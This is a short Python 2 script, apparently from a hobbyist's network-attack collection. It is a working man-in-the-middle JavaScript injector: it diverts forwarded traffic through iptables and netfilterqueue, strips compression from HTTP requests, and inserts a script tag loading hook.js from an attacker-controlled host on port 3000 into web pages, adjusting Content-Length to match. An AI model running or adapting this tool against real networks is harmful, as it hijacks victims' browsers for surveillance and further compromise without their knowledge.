#  Copyright (c) 2019. - ciphyr
#  Email: ciphyr[at]protonmail.com
#
#  Licensed under the Apache License, Version 2.0 (the "License");
#  You may not use this file except in compliance with the License.
#  You may obtain a copy of the License at
#
#  http://www.apache.org/licenses/LICENSE-2.0
#
#  Unless required by applicable law or agreed to in writing, software
#  distributed under the License is distributed on an "AS IS" BASIS,
#  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
#  See the License for the specific language governing permissions and
#  limitations under the License.


import netfilterqueue
import scapy.all as scapy
import optparse
import subprocess
import re


# Note: Python2 only due to netfilterqueue
# Future Improvements
# Major clean up, fix argparse

def config_iptables():
    subprocess.call(["iptables", "-I", "FORWARD", "-j", "NFQUEUE", "--queue-num", "0"])


def flush_iptables():
    print("[-] Flushing IP tables")
    subprocess.call(["iptables", "--flush"])


def get_cmd_args():
    parser = optparse.OptionParser()
    parser.add_option("-d", "--download", dest="download_url", help="Destination URL for spoofed download")
    (options, arguements) = parser.parse_args()

    if not options.download_url:
        parser.error("Use --help for usage info")

    return options


def set_load(packet, load):
    packet[scapy.Raw].load = load
    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    del packet[scapy.TCP].chksum
    return packet


def analyze_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.Raw):
        packet_load = scapy_packet[scapy.Raw].load
        # HTTP Requests
        if scapy_packet[scapy.TCP].dport == 80:
            print("[+] Disabling Encoding")
            packet_load = re.sub("Accept-Encoding:.*?\\r\\n", "", packet_load)
            modified_packet = set_load(scapy_packet, packet_load)
            packet.set_payload(str(modified_packet))

        # HTTP Responses
        elif scapy_packet[scapy.TCP].sport == 80:
            print("[+] Injecting")
            injection_code = '<script src="http://<IP>:3000/hook.js"></script>'
            packet_load = packet_load.replace("</body>", injection_code + "</body>")
            modified_packet = set_load(scapy_packet, packet_load)
            packet.set_payload(str(modified_packet))

            content_length_search = re.search("(?:Content-Length:\s)(\d*)", packet_load)
            if content_length_search and "text/html" in packet_load:
                content_length = content_length_search.group(1)
                new_content_length = int(content_length) + len(injection_code)
                packet_load = packet_load.replace(content_length, str(new_content_length))
                modified_packet = set_load(scapy_packet, packet_load)
                packet.set_payload(str(modified_packet))

    packet.accept()


queue = netfilterqueue.NetfilterQueue()
queue.bind(0, analyze_packet)

print("[+] JS Injector Ready.")

try:
    queue.run()
except KeyboardInterrupt:
    print("[=] Complete. Program quiting...")
